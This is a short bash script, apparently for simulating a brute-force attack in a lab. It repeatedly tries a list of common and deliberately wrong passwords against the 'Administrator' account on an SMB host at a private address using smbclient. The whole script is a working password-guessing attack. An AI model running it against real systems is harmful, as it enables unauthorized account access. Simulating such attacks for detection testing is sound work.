#!/bin/bash
# simulate_bruteforce.sh
TARGET="192.168.122.197"
USER="Administrator"
PASSWORDS=("wrongpass1" "wrongpass2" "123456" "password" "admin123" "letmein" "qwerty123" "P@ssw0rd" "wrongpass9" "testpass10")

for pass in "${PASSWORDS[@]}"; do
    echo "Trying: $pass"
    smbclient -L //$TARGET -U "$USER%$pass" 2>&1 | grep -i "error\|success"
    sleep 1
done
